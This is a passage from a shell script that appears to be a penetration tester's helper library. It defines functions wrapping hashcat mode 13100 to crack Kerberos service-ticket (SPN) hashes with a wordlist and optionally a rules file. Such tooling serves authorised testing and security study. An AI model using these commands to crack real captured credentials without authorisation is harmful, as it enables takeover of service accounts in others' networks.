    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 13100 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackSPNsRules(){
    # DESCRIPTION: Crack SPN hashes with rules.
    # ARGUMENT: crackSPNs TARGET, DICTIONARY, RULES.
    TARGET=$1;
    DICTIONARY=$2;
    RULES=$3;
    hashcat -m 13100 -a 0 $TARGET $DICTIONARY --rules-file $RULES --force
    return;
}
